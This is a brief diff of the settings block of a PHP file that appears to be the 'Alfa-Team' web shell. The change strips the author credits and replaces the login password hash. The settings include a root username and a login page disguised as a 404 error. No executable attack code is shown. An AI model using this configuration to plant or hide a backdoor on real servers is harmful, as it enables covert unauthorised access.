@@ -1,14 +1,7 @@
 <?php
-/*
-	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
-*/
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'root',
-    'password' => '$2y$10$lHbtu9uggcN7j1aV.B1iCep.MdTiMReRZklHik4BuuNeQQXx/zSgW',//md5(ehsan)
+    'password' => '$2y$10$fexGwuW4M0N8lYiFG/hBO.tcKifAZ0zEZifASO0IBfWhOAVrEeUli',
     'safe_mode' => '1',
     'login_page' => '404',
     'show_icons' => '1',
